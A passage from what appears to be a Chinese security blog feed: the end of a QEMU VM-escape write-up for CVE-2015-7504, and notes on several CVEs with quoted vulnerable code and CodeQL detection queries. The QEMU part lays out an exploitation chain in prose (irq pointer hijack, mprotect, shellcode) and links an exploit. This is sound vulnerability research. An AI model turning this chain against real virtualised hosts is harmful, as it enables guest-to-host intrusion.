!CSR_DXMTFCS(s) || size &lt; MIN_BUF_SIZE+<span class="number">4</span>) &#123;</span><br><span class="line">                <span class="keyword">uint32_t</span> fcs = ~<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">uint8_t</span> *p = src;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (p != &amp;src[size])</span><br><span class="line">                    CRC(fcs, *p++);</span><br><span class="line">                *(<span class="keyword">uint32_t</span> *)p = htonl(fcs);</span><br><span class="line">                size += <span class="number">4</span>;</span><br><span class="line">...</span><br><span class="line">    pcnet_update_irq(s);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> size_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到当size大小刚好是s-&gt;buffer大小的时候，<code>*(uint32_t *)p = htonl(fcs);</code>这句话越界了四字节；看下与越界相关的结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PCNetState_st</span> &#123;</span></span><br><span class="line">    NICState *nic;</span><br><span class="line">    NICConf conf;</span><br><span class="line">    QEMUTimer *poll_timer;</span><br><span class="line">    <span class="keyword">int</span> rap, isr, lnkst;</span><br><span class="line">    <span class="keyword">uint32_t</span> rdra, tdra;</span><br><span class="line">    <span class="keyword">uint8_t</span> prom[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint16_t</span> csr[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">uint16_t</span> bcr[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">int</span> xmit_pos;</span><br><span class="line">    <span class="keyword">uint64_t</span> timer;</span><br><span class="line">    MemoryRegion mmio;</span><br><span class="line">    <span class="keyword">uint8_t</span> buffer[<span class="number">4096</span>];</span><br><span class="line">    qemu_irq irq;</span><br><span class="line">    <span class="keyword">void</span> (*phys_mem_read)(<span class="keyword">void</span> *dma_opaque, hwaddr addr,</span><br><span class="line">                         <span class="keyword">uint8_t</span> *buf, <span class="keyword">int</span> len, <span class="keyword">int</span> do_bswap);</span><br><span class="line">    <span class="keyword">void</span> (*phys_mem_write)(<span class="keyword">void</span> *dma_opaque, hwaddr addr,</span><br><span class="line">                          <span class="keyword">uint8_t</span> *buf, <span class="keyword">int</span> len, <span class="keyword">int</span> do_bswap);</span><br><span class="line">    <span class="keyword">void</span> *dma_opaque;</span><br><span class="line">    <span class="keyword">int</span> tx_busy;</span><br><span class="line">    <span class="keyword">int</span> looptest;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">IRQState</span> *<span class="title">qemu_irq</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">IRQState</span> &#123;</span></span><br><span class="line">    Object parent_obj;</span><br><span class="line"></span><br><span class="line">    qemu_irq_handler handler;</span><br><span class="line">    <span class="keyword">void</span> *opaque;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看出，<code>pcnet_update_irq(s);</code>存在对<code>qemu_set_irq</code>的调用，而<code>qemu_set_irq</code>中又存在<code>irq-&gt;handler(irq-&gt;opaque, irq-&gt;n, level);</code>所以我们控制<code>irq</code>即可劫持程序流程。</p><h3 id="利用思路-3"><a href="#利用思路-3" class="headerlink" title="利用思路"></a>利用思路</h3><p>利用思路还是比较清晰的：</p><ul><li>利用<code>CVE-2015-5165</code>得到程序加载地址和堆地址；</li><li>将<code>irq</code>指针的低四位覆盖指向<code>s-&gt;buffer</code>中的某处，并在该处伪造好相应的<code>irq</code>结构体；</li><li>存在问题是想要通过<code>mprotect</code>设置内存为可执行，但无法控制第三个参数；<ul><li>解决方法是构造两个<code>irq</code>，第一个函数指针指向了<code>qemu_set_irq</code>，将<code>opque</code>设置为第二个<code>irq</code>的地址，<code>irq-&gt;n</code>设置为7；</li><li>第二个<code>irq</code>则将<code>handler</code>设置为<code>mprotect</code>，<code>opaque</code>设置为对应的地址，n设置为相应的地址，以此来实现第三个参数的控制。当<code>mprotect</code>成功执行后，再通过网卡数据的设置，控制执行流重新执行<code>shellcode</code>的地址，实现利用。</li></ul></li></ul><h3 id="完整exp-3"><a href="#完整exp-3" class="headerlink" title="完整exp"></a>完整exp</h3><p><a href="https://github.com/ray-cp/vm-escape/tree/master/qemu-escape/cve-2015-5165_and_cve-2015-7504">exp</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;基础知识相关是在这看的：&lt;a href=&quot;https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;qemu-pwn-基础知识&lt;/a&gt;&lt;/p&gt;
&lt;p
      
    
    </summary>
    
    
      <category term="二进制" scheme="https://github.com/Cracke-S-J/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="vm" scheme="https://github.com/Cracke-S-J/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/vm/"/>
    
    
      <category term="二进制" scheme="https://github.com/Cracke-S-J/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="vm" scheme="https://github.com/Cracke-S-J/tags/vm/"/>
    
  </entry>
  
  <entry>
    <title>一些CVE和其它安全相关文章阅读整理（二）</title>
    <link href="https://github.com/Cracke-S-J/2020/06/21/%E4%B8%80%E4%BA%9BCVE%E6%96%87%E7%AB%A0%E9%98%85%E8%AF%BB%E6%95%B4%E7%90%86%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://github.com/Cracke-S-J/2020/06/21/%E4%B8%80%E4%BA%9BCVE%E6%96%87%E7%AB%A0%E9%98%85%E8%AF%BB%E6%95%B4%E7%90%86%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2020-06-20T16:47:48.000Z</published>
    <updated>2020-06-24T13:52:15.373Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Kernel-crash-caused-by-out-of-bounds-write-in-Apple’s-ICMP-packet-handling-code-CVE-2018-4407"><a href="#Kernel-crash-caused-by-out-of-bounds-write-in-Apple’s-ICMP-packet-handling-code-CVE-2018-4407" class="headerlink" title="Kernel crash caused by out-of-bounds write in Apple’s ICMP packet-handling code (CVE-2018-4407)"></a>Kernel crash caused by out-of-bounds write in Apple’s ICMP packet-handling code (CVE-2018-4407)</h2><p>主要看这里：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">icp = mtod(m, struct icmp *);</span><br><span class="line"></span><br><span class="line">MH_ALIGN(m, m-&gt;m_len);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MH_ALIGN(m, len)                                  \</span></span><br><span class="line"><span class="keyword">do</span> &#123;                                                      \</span><br><span class="line">  (m)-&gt;m_data += (MHLEN - (len)) &amp;~ (<span class="keyword">sizeof</span> (<span class="keyword">long</span>) - <span class="number">1</span>);  \</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>MHLEN是88，len是icmplen + 8，如果icmplen &gt; 80的话，会产生溢出。</p><h2 id="Apache-Struts-double-evaluation-RCE-lottery"><a href="#Apache-Struts-double-evaluation-RCE-lottery" class="headerlink" title="Apache Struts double evaluation RCE lottery"></a>Apache Struts double evaluation RCE lottery</h2><p>学个词叫Double evaluation；用CodeQL找Double evaluaton。</p><h2 id="OGNL-injection-in-Apache-Struts-Discovering-exploits-with-taint-tracking"><a href="#OGNL-injection-in-Apache-Struts-Discovering-exploits-with-taint-tracking" class="headerlink" title="OGNL injection in Apache Struts: Discovering exploits with taint tracking"></a>OGNL injection in Apache Struts: Discovering exploits with taint tracking</h2><p><a href="https://securitylab.github.com/research/ognl-injection-apache-struts" target="_blank" rel="noopener">CodeQL软广</a></p><h2 id="CVE-2018-11776-How-to-find-5-RCEs-in-Apache-Struts-with-CodeQL"><a href="#CVE-2018-11776-How-to-find-5-RCEs-in-Apache-Struts-with-CodeQL" class="headerlink" title="CVE-2018-11776: How to find 5 RCEs in Apache Struts with CodeQL"></a>CVE-2018-11776: How to find 5 RCEs in Apache Struts with CodeQL</h2><p><a href="https://securitylab.github.com/research/apache-struts-CVE-2018-11776" target="_blank" rel="noopener">CodeQL软广</a></p><h2 id="Librelp-buffer-overflow-fix-cve-2018-1000140"><a href="#Librelp-buffer-overflow-fix-cve-2018-1000140" class="headerlink" title="Librelp buffer overflow fix (cve-2018-1000140)"></a>Librelp buffer overflow fix (cve-2018-1000140)</h2><p>Reliable Event Logging Protocol (RELP) library</p><p>RELP provides reliable event logging over the network.</p><p>RELP (and hence) librelp assures that no message is lost, not even when connections break and a peer becomes unavailable. The current version of RELP has a minimal window of opportunity for message duplication after a session has been broken due to network problems. In this case, a few messages may be duplicated (a problem that also exists with plain tcp syslog). Future versions of RELP will address this shortcoming.</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>感觉上面见过类似的洞，溢出之后就保护不了了，应该check一下。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* first search through the dNSName subject alt names */</span></span><br><span class="line">iAltName = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(!bFoundPositiveMatch) &#123; <span class="comment">/* loop broken below */</span></span><br><span class="line">  szAltNameLen = <span class="keyword">sizeof</span>(szAltName);</span><br><span class="line">  gnuRet = gnutls_x509_crt_get_subject_alt_name(cert, iAltName,</span><br><span class="line">                                                szAltName, &amp;szAltNameLen, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span>(gnuRet &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(gnuRet == GNUTLS_SAN_DNSNAME) &#123;</span><br><span class="line">    pThis-&gt;pEngine-&gt;dbgprint(<span class="string">"librelp: subject alt dnsName: '%s'\n"</span>, szAltName);</span><br><span class="line">    iAllNames += <span class="built_in">snprintf</span>(allNames+iAllNames, <span class="keyword">sizeof</span>(allNames)-iAllNames,</span><br><span class="line">                          <span class="string">"DNSname: %s; "</span>, szAltName);</span><br><span class="line">    relpTcpChkOnePeerName(pThis, szAltName, &amp;bFoundPositiveMatch);</span><br><span class="line">    <span class="comment">/* do NOT break, because there may be multiple dNSName's! */</span></span><br><span class="line">  &#125;</span><br><span class="line">  ++iAltName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CVE-2018-4249-amp-CVE-2017-13904-Remote-code-execution-in-Apple’s-packet-mangler"><a href="#CVE-2018-4249-amp-CVE-2017-13904-Remote-code-execution-in-Apple’s-packet-mangler" class="headerlink" title="CVE-2018-4249 &amp; CVE-2017-13904: Remote code execution in Apple’s packet mangler"></a>CVE-2018-4249 &amp; CVE-2017-13904: Remote code execution in Apple’s packet mangler</h2><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">tcp_optlen = (tcp.th_off &lt;&lt; <span class="number">2</span>)-<span class="keyword">sizeof</span>(struct tcphdr);   <span class="comment">// &lt;- tcp.th_off为0，tcp_optlen负溢出</span></span><br><span class="line">PKT_MNGLR_LOG(LOG_INFO, <span class="string">"Packet from F5 is TCP\n"</span>);</span><br><span class="line">PKT_MNGLR_LOG(LOG_INFO, <span class="string">"Optlen: %d\n"</span>, tcp_optlen);</span><br><span class="line">orig_tcp_optlen = tcp_optlen;                           <span class="comment">// &lt;- 赋值运算</span></span><br><span class="line"><span class="keyword">if</span> (orig_tcp_optlen) &#123;</span><br><span class="line">    error = mbuf_copydata(*data, offset+<span class="keyword">sizeof</span>(struct tcphdr), orig_tcp_optlen, tcp_opt_buf);   <span class="comment">// &lt;- 溢出</span></span><br><span class="line">    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">        PKT_MNGLR_LOG(LOG_ERR, <span class="string">"Failed to copy tcp options"</span>);</span><br><span class="line">        <span class="keyword">goto</span> input_done;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (tcp_optlen) &#123;</span><br><span class="line">    <span class="keyword">if</span> (tcp_opt_buf[i] == <span class="number">0x1</span>) &#123;</span><br><span class="line">        PKT_MNGLR_LOG(LOG_INFO, <span class="string">"Skipping NOP\n"</span>);</span><br><span class="line">        tcp_optlen--;</span><br><span class="line">        i++;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((tcp_opt_buf[i] != <span class="number">0</span>) &amp;&amp; (tcp_opt_buf[i] != TCP_OPT_MULTIPATH_TCP)) &#123;</span><br><span class="line">        PKT_MNGLR_LOG(LOG_INFO, <span class="string">"Skipping option %x\n"</span>, tcp_opt_buf[i]);</span><br><span class="line">        tcp_optlen -= tcp_opt_buf[i+<span class="number">1</span>];</span><br><span class="line">        i += tcp_opt_buf[i+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (tcp_opt_buf[i] == TCP_OPT_MULTIPATH_TCP) &#123;</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> mptcpoptlen = tcp_opt_buf[i+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">uint8_t</span> sbtver = tcp_opt_buf[i+MPTCP_SBT_VER_OFFSET];</span><br><span class="line">        <span class="keyword">uint8_t</span> subtype = sbtver &gt;&gt; <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">        PKT_MNGLR_LOG(LOG_INFO, <span class="string">"Got MPTCP option %x\n"</span>, tcp_opt_buf[i]);</span><br><span class="line">        PKT_MNGLR_LOG(LOG_INFO, <span class="string">"Got MPTCP subtype %x\n"</span>, subtype);</span><br><span class="line">        <span class="keyword">if</span> (subtype == MPTCP_SUBTYPE_DSS) &#123;</span><br><span class="line">            PKT_MNGLR_LOG(LOG_INFO, <span class="string">"Got DSS option\n"</span>);</span><br><span class="line">            PKT_MNGLR_LOG(LOG_INFO, <span class="string">"Protocol option mask: %d\n"</span>, p_pkt_mnglr-&gt;proto_action_mask);</span><br><span class="line">            <span class="keyword">if</span> (p_pkt_mnglr-&gt;proto_action_mask &amp;</span><br><span class="line">                PKT_MNGLR_TCP_ACT_DSS_DROP) &#123;</span><br><span class="line">                <span class="keyword">goto</span> drop_it;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        PKT_MNGLR_LOG(LOG_INFO, <span class="string">"Got MPTCP option %x\n"</span>, tcp_opt_buf[i]);</span><br><span class="line">        <span class="keyword">for</span> (; j &lt; mptcpoptlen; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p_pkt_mnglr-&gt;proto_action_mask &amp;</span><br><span class="line">                PKT_MNGLR_TCP_ACT_NOP_MPTCP) &#123;</span><br><span class="line">                tcp_opt_buf[i+j] = <span class="number">0x1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        tcp_optlen -= mptcpoptlen;</span><br><span class="line">        i += mptcpoptlen;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        tcp_optlen--;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一处漏洞是这个while可能停不了，还有一处整数溢出造成的栈溢出。</p><h3 id="用CodeQL查找"><a href="#用CodeQL查找" class="headerlink" title="用CodeQL查找"></a>用CodeQL查找</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line">import semmle.code.cpp.rangeanalysis.SimpleRangeAnalysis</span><br><span class="line"></span><br><span class="line">// Find an assignment like this:  x[i+j] = v</span><br><span class="line">from ArrayExpr ae, BinaryArithmeticOperation idx, Assignment assign</span><br><span class="line">where ae = assign.getLValue()</span><br><span class="line">  and idx = ae.getArrayOffset()</span><br><span class="line">  and convertedExprMightOverflow(idx)</span><br><span class="line"><span class="keyword">select</span> idx, <span class="string">"Array index might overflow"</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">// Find loops like this:</span><br><span class="line">// while (x) &#123; ...; x -= n; &#125;</span><br><span class="line">from Loop loop, Variable v, AssignArithmeticOperation assign</span><br><span class="line">where loop.getCondition() = v.getAnAccess()</span><br><span class="line">  and assign.getLValue() = v.getAnAccess()</span><br><span class="line">  // Compound assignment is in the body of the loop:</span><br><span class="line">  and assign = loop.getStmt().getAChild*()</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">loop</span>, loop.getFile().getRelativePath()</span><br></pre></td></tr></table></figure><h2 id="Apple-NFS-Diskless-Boot-CVE-2018-4136-amp-CVE-2018-4160"><a href="#Apple-NFS-Diskless-Boot-CVE-2018-4136-amp-CVE-2018-4160" class="headerlink" title="Apple NFS Diskless Boot (CVE-2018-4136 &amp; CVE-2018-4160)"></a>Apple NFS Diskless Boot (CVE-2018-4136 &amp; CVE-2018-4160)</h2><h3 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">627</span>:  p = mbuf_data(m);                     <span class="comment">// &lt;- 来自用户</span></span><br><span class="line"><span class="number">628</span>:  msg_len = mbuf_len(m);</span><br><span class="line"><span class="number">629</span>:</span><br><span class="line"><span class="number">630</span>:  <span class="comment">/* server name */</span></span><br><span class="line"><span class="number">631</span>:  <span class="keyword">if</span> (msg_len &lt; (<span class="keyword">int</span>)<span class="keyword">sizeof</span>(*str))      <span class="comment">// &lt;- 没有检查为负数的情况</span></span><br><span class="line"><span class="number">632</span>:    <span class="keyword">goto</span> bad;</span><br><span class="line"><span class="number">633</span>:  str = (struct rpc_string *)p;</span><br><span class="line"><span class="number">634</span>:  sn_len = ntohl(str-&gt;len);</span><br><span class="line"><span class="number">635</span>:  <span class="keyword">if</span> (msg_len &lt; sn_len)</span><br><span class="line"><span class="number">636</span>:    <span class="keyword">goto</span> bad;</span><br><span class="line"><span class="number">637</span>:  <span class="keyword">if</span> (sn_len &gt;= MAXHOSTNAMELEN)</span><br><span class="line"><span class="number">638</span>:    <span class="keyword">goto</span> bad;</span><br><span class="line"><span class="number">639</span>:  bcopy(str-&gt;data, serv_name, sn_len);  <span class="comment">// &lt;- 崩</span></span><br></pre></td></tr></table></figure><h3 id="CodeQL查询bcopy可能带有负参数的调用"><a href="#CodeQL查询bcopy可能带有负参数的调用" class="headerlink" title="CodeQL查询bcopy可能带有负参数的调用"></a>CodeQL查询bcopy可能带有负参数的调用</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line">import semmle.code.cpp.rangeanalysis.SimpleRangeAnalysis</span><br><span class="line"></span><br><span class="line">from FunctionCall <span class="keyword">call</span></span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">  call.getTarget().getName() = <span class="string">"__builtin___memmove_chk"</span> <span class="keyword">and</span></span><br><span class="line">  lowerBound(call.getArgument(<span class="number">2</span>)) &lt; <span class="number">0</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">call</span></span><br></pre></td></tr></table></figure><h2 id="Etherpad-reflected-file-download-CVE-2018-6835"><a href="#Etherpad-reflected-file-download-CVE-2018-6835" class="headerlink" title="Etherpad reflected file download (CVE-2018-6835)"></a>Etherpad reflected file download (CVE-2018-6835)</h2><h3 id="Reflected-file-download-RFD"><a href="#Reflected-file-download-RFD" class="headerlink" title="Reflected file download (RFD)"></a>Reflected file download (RFD)</h3><p>Reflected file download (RFD) is a relatively new attack vector discovered in 2014 by Oren Hafif. It has since affected multiple organizations and applications, including Google. This attack works very similarly to the more familiar cross site scripting (XSS), which relies on the victim clicking on a URL link that comes from a trusted domain. In the case of RFD, instead of running JavaScript in the victim’s browser, an executable file will be offered to the user as a download. As the file appears to originate from a trusted domain, the victim may then think that it is safe to run the file. The main ingredients in an RFD vulnerability are:</p><ul><li>User input in the URL being reflected back in the response.</li><li>The vulnerable URL is permissive and allows the file name to be manipulated.</li></ul><h2 id="Spring-Data-REST-exploit-CVE-2017-8046-Finding-a-RCE-vulnerability-with-CodeQL"><a href="#Spring-Data-REST-exploit-CVE-2017-8046-Finding-a-RCE-vulnerability-with-CodeQL" class="headerlink" title="Spring Data REST exploit (CVE-2017-8046): Finding a RCE vulnerability with CodeQL"></a>Spring Data REST exploit (CVE-2017-8046): Finding a RCE vulnerability with CodeQL</h2><p><a href="https://securitylab.github.com/research/spring-data-rest-CVE-2017-8046-ql" target="_blank" rel="noopener">https://securitylab.github.com/research/spring-data-rest-CVE-2017-8046-ql</a></p><p>Spring表达式注入。</p><h2 id="Android-Deserialization-Vulnerabilities-A-Brief-history"><a href="#Android-Deserialization-Vulnerabilities-A-Brief-history" class="headerlink" title="Android Deserialization Vulnerabilities: A Brief history"></a>Android Deserialization Vulnerabilities: A Brief history</h2><h3 id="Android中反序列化成因"><a href="#Android中反序列化成因" class="headerlink" title="Android中反序列化成因"></a>Android中反序列化成因</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Intent intent = getIntent();</span><br><span class="line">String expected = intent.getStringExtra(<span class="string">"EXPECTED"</span>);</span><br></pre></td></tr></table></figure><p><code>getStringExtra</code>的时候，会把Bundle中所有参数都反序列化。</p><h3 id="从Java反序列化攻击C"><a href="#从Java反序列化攻击C" class="headerlink" title="从Java反序列化攻击C++"></a>从Java反序列化攻击C++</h3><p>通常有的Java对象只是C++对象的wrapper，这种对象通常有long型的C++指针，调用C++分配对象，调用finalize释放对象。</p><p>通常这种对象叫BinderProxy，有两个指针，mObject和mOrgue，只要劫持这两个指针，就可以造成内存问题，finalize通常长下面这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    destroy();</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">super</span>.finalize();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CVE-2014-7911-Privilege-Escalation-using-ObjectInputStream"><a href="#CVE-2014-7911-Privilege-Escalation-using-ObjectInputStream" class="headerlink" title="CVE-2014-7911: Privilege Escalation using ObjectInputStream"></a>CVE-2014-7911: Privilege Escalation using ObjectInputStream</h3><p>ObjectInputStream没有check类是否可以序列化，直接反序列化，导致攻击者可以任意反序列化BinderProxy类，劫持其中的指针。</p><h3 id="Finding-C-proxy-classes-with-CodeQL"><a href="#Finding-C-proxy-classes-with-CodeQL" class="headerlink" title="Finding C++ proxy classes with CodeQL"></a>Finding C++ proxy classes with CodeQL</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">predicate finalizeNative(FinalizeMethod finalize, Method free, RefType finalizeType) &#123;</span><br><span class="line">  free.isNative() and // The free method should be native</span><br><span class="line">  finalize.polyCalls(free) and // The finalize should <span class="keyword">call</span> free</span><br><span class="line">  finalize.getDeclaringType() = finalizeType <span class="keyword">and</span></span><br><span class="line">  (</span><br><span class="line">    // Either free <span class="keyword">is</span> declared <span class="keyword">in</span> a subclass <span class="keyword">of</span> the finalize <span class="keyword">class</span>, so that it can <span class="keyword">access</span> the pointers</span><br><span class="line">    free.getDeclaringType().getASupertype*() = finalizeType <span class="keyword">or</span></span><br><span class="line">    // <span class="keyword">Or</span> the pointers <span class="keyword">are</span> passed <span class="keyword">to</span> it <span class="keyword">as</span> arguments.</span><br><span class="line">    // The pointer <span class="keyword">fields</span> should be declared <span class="keyword">in</span> a subclass <span class="keyword">of</span> the finalize class.</span><br><span class="line">    <span class="keyword">exists</span>(MethodAccess ma, <span class="keyword">Field</span> ptr | ptr.getDeclaringType().getASupertype*() = finalizeType |</span><br><span class="line">      ma.getMethod() = free <span class="keyword">and</span></span><br><span class="line">      ptr.getAnAccess() = ma.getAnArgument() <span class="keyword">and</span></span><br><span class="line">      ptr.getType().getName() = <span class="string">"long"</span> // The pointer <span class="keyword">fields</span> should be <span class="keyword">of</span> <span class="keyword">type</span> <span class="keyword">long</span></span><br><span class="line">    )</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> FinalizeMethod finalize, Method free, RefType finalizeType</span><br><span class="line"><span class="keyword">where</span> finalizeNative(finalize, free, finalizeType)</span><br><span class="line"><span class="keyword">select</span> finalizeType.getQualifiedName()</span><br></pre></td></tr></table></figure><h3 id="CVE-2015-3825-One-class-to-rule-them-all"><a href="#CVE-2015-3825-One-class-to-rule-them-all" class="headerlink" title="CVE-2015-3825: One class to rule them all"></a>CVE-2015-3825: One class to rule them all</h3><p><code>OpenSSLX509Certificate</code>中的<code>mContext</code>也有同样效果。</p><h3 id="CVE-2017-411-and-CVE-2017-412-Ashmem-race-conditions-in-MemoryIntArray"><a 